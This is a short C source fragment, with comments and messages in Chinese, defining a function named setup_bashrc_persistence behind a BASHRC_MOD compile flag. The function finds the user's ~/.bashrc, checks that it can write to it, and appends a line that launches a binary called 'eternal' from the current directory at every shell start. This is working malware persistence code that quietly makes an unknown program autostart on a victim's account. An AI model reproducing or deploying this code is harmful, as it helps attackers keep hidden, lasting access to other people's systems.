#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

#ifdef BASHRC_MOD
void setup_bashrc_persistence() {
    printf("设置bashrc持久化...\n");
    const char* bashrc_path = getenv("HOME");
    if (!bashrc_path) {
        printf("无法获取HOME环境变量。\n");
        return;
    }

    char full_path[512];
    snprintf(full_path, sizeof(full_path), "%s/.bashrc", bashrc_path);

    // 阶段1: 检查文件存在性和访问权限
    struct stat statbuf;
    if (stat(full_path, &statbuf) != 0) {
        perror("检查 .bashrc 文件失败");
        return;
    }

    if (access(full_path, W_OK) != 0) {
        perror("没有写权限到 .bashrc 文件");
        return;
    }

    // 阶段2: 执行写入操作
    FILE *bashrc = fopen(full_path, "a");
    if (!bashrc) {
        perror("无法打开 .bashrc 文件进行写入");
        return;
    }
    printf("在 %s 中添加持久化命令。\n", full_path);
    char* current_dir = getcwd(NULL, 0); // 动态分配，需要释放
    if (current_dir) {
        fprintf(bashrc, "%s/eternal\n", current_dir);
        free(current_dir); // 释放由 getcwd 分配的内存
    }
    fclose(bashrc);
}
#endif
